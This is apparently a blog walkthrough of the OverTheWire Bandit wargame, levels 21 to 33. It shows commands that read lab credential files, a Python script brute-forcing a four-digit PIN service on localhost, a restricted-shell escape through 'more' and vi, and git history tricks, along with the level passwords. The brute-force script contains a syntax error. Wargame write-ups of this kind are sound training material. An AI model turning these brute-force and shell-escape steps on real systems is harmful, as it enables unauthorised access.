---
title: "Linux training with overthewire [Part 3/10: Bandit 21-30]"
date: 2018-11-30T12:00:00
layout: post
categories:
  - opensource
  - linux
  - bash
  - shell
  - hack
  - server
---
Excerpt here...
<!--more-->

This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-2 %})
- Linux training with overthewire Part 3: Bandit 21-30
- [Linux training with overthewire Part 4: Natas 1-10]({% post_url 2018/2018-11-30-linux-training-overthewire-natas-1 %})
- [Linux training with overthewire Part 5: Natas 11-20]({% post_url 2018/2018-11-30-linux-training-overthewire-natas-2 %})
- [Linux training with overthewire Part 6: Leviathan]({% post_url 2018/2018-11-30-linux-training-overthewire-leviathan %})
- [Linux training with overthewire Part 7: Krypton]({% post_url 2018/2018-11-30-linux-training-overthewire-krypton %})

### Level 21 - CRON
```bash
ssh -p 2220 bandit21@bandit.labs.overthewire.org
# gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr http://overthewire.org/wargames/bandit/bandit22.html
```
```bash
$ cat /etc/cron.d/
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
$ cat /usr/bin/cronjob_bandit22.sh
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

### Level 22 - Bash script 1
```bash
ssh -p 2220 bandit22@bandit.labs.overthewire.org
# Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI http://overthewire.org/wargames/bandit/bandit23.html
```
```bash
$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
$ myname=bandit23 && echo $(echo I am user $myname | md5sum | cut -d ' ' -f 1)
8ca319486bfbbc3663ea0fbe81326349
$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

### Level 23 - Bash script 2
```bash
ssh -p 2220 bandit23@bandit.labs.overthewire.org
# jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n http://overthewire.org/wargames/bandit/bandit24.html
```
```bash
$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
$ ls /var/spool/bandit24/
lol.sh  script.sh
$ cat /var/spool/bandit24/*
#!/bin/sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AuFwziaI3a/lol.txt
$ cat /tmp/tmp.AuFwziaI3a/lol.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

### Level 24 - Bruteforce script (in `python`)
```bash
ssh -p 2220 bandit24@bandit.labs.overthewire.org
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ http://overthewire.org/wargames/bandit/bandit25.html
```
Let's test first with `nc`
```bash
$ echo "$(cat /etc/bandit_pass/bandit24) 0000" | nc localhost 30002
Wrong! Please enter the correct pincode. Try again.
```
Now that we have our Bad Boy (Wrong...), it's Bruteforce time! From 0000 to 9999. I choose python and the standard `socket` library:
- `bytes_data = socket.recv(buffer_size)` to receive data
- `socket.sendall(bytes_data)` to send data

Quick test in python 3:
```bash
$ cd $(mktemp -d) && vim main.py
```
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002)); s.recv(1024) # to remove first banner msg
for i in range(0,3):
    s.sendall(str.encode('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i)+'\n'))
    print(s.recv(1024).decode()) # print response
```
```bash
$ python3 main.py
b'Wrong! Please enter the correct pincode. Try again.\n'
b'Wrong! Please enter the correct pincode. Try again.\n'
b'Wrong! Please enter the correct pincode. Try again.\n'
```

Full code in python:
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002)); s.recv(1024)
for i in range(0,9999):
    pin = str(i).zfill(4)
    if i%100 == 0:
      print('Sending '+pin)
    s.sendall(str.encode('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+pin+'\n'))
    data = s.recv(1024).decode()
    if not data.startswith('Wrong'):
      print('PIN '+pin+': 'data)
      exit()
```
```terminal
Sending 0000
Sending 0100
Sending 0200
Sending 0300
PIN 0378: Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

### Level 25 - Custom shell
```bash
ssh -p 2220 bandit25@bandit.labs.overthewire.org
# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG http://overthewire.org/wargames/bandit/bandit26.html
```

Exploit of the `more` command by reducing terminal's height so `more` hangs. This way we can execute command such as `v` to fire up a `vi` editor.

Then in `vi`:
```
:set shell=/bin/bash`
:shell
$ id
uid=11026(bandit26) gid=11026(bandit26) groups=11026(bandit26)
```

### Level 26 -
```bash
Connect from previous level
```
```bash
$ ls
bandit27-do  text.txt
$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```

## Level 27 - `git clone`
```bash
ssh -p 2220 bandit27@bandit.labs.overthewire.org
# 3ba3118a22e93127a4ed485be72ef5ea http://overthewire.org/wargames/bandit/bandit28.html
```
```bash
$ cd $(mktemp -d)
$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo && ls repo
README
$ cat repo/README
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
```

## Level 28 - `git log`
```bash
ssh -p 2220 bandit28@bandit.labs.overthewire.org
# 0ef186ac70e04ea33b4c1853d2526fa2 http://overthewire.org/wargames/bandit/bandit29.html
```
```bash
$ cd $(mktemp -d)
$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo && cd repo && ls
README
$ cat README.md
- username: bandit29
- password: xxxxxxxxxx
$ git log --follow -p -- README.md
index 3f7cee8..5c6457b 100644
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 - username: bandit29
-- password: bbc96594b4e001778eee9975372716b2
+- password: xxxxxxxxxx
```

## Level 29 - `git log -all`
```bash
ssh -p 2220 bandit29@bandit.labs.overthewire.org
# bbc96594b4e001778eee9975372716b2 http://overthewire.org/wargames/bandit/bandit30.html
```
```bash
$ cd $(mktemp -d)
$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo && cd repo && ls
$ cat README.md
password: <no passwords in production!>
$ git log --all --pretty=oneline
33ce2e95d9c5d6fb0a40e5ee9a2926903646b4e3 add data needed for development
$ git checkout 33ce2e95d9c5d6fb0a40e5ee9a2926903646b4e3
$ cat README.md
- password: 5b90576bedb2cc04c86a9e924ce42faf
```

## Level 30 - `git tag`
```bash
ssh -p 2220 bandit30@bandit.labs.overthewire.org
# 5b90576bedb2cc04c86a9e924ce42faf http://overthewire.org/wargames/bandit/bandit31.html
```
```bash
$ cd $(mktemp -d)
$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo && cd repo && ls
README.md
$ cat README.md
just an epmty file... muahaha
$ git log --all --pretty=oneline
3aa4c239f729b07deb99a52f125893e162daac9e initial commit of README.md
$ git branch
* master
$ git tag
secret
$ git show secret
47e603bb428404d265f59c42920d81e5
```

## Level 31 - `.gitignore`
```bash
ssh -p 2220 bandit31@bandit.labs.overthewire.org
# 47e603bb428404d265f59c42920d81e5 http://overthewire.org/wargames/bandit/bandit32.html
```
```bash
$ cd $(mktemp -d)
$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo && cd repo && ls
README.md
$ cat README.md
This time your task is to push a file to the remote repository.
    File name: key.txt
    Content: 'May I come in?'
$ echo 'May I come in?' > key.txt
$ git add key.txt
The following paths are ignored by one of your .gitignore files: key.txt
$ ls -a
.git  .gitignore  README.md
$ cat .gitignore
*.txt
$ rm .gitignore
$ git add .
$ git commit -m 'yo'
$ git push
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
```

## Level 32 - Modified shell
```bash
ssh -p 2220 bandit32@bandit.labs.overthewire.org
# 47e603bb428404d265f59c42920d81e5 http://overthewire.org/wargames/bandit/bandit33.html
```
```bash
>> ls
sh: 1: LS: not found
>> $0
$ id
uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```

## Level 33 - That's it folks!
```bash
ssh -p 2220 bandit32@bandit.labs.overthewire.org
# c9c3199ddf4121b10cf581a98d51caee http://overthewire.org/wargames/bandit/bandit33.html
```
```bash
$ ls
README.txt
$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
```

This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018/2018-11-30-linux-training-overthewire-bandit-2 %})
- Linux training with overthewire Part 3: Bandit 21-30
- [Linux training with overthewire Part 4: Natas]({% post_url 2018/2018-11-30-linux-training-overthewire-natas-1 %})
- [Linux training with overthewire Part 5: Leviathan]({% post_url 2018/2018-11-30-linux-training-overthewire-leviathan %})
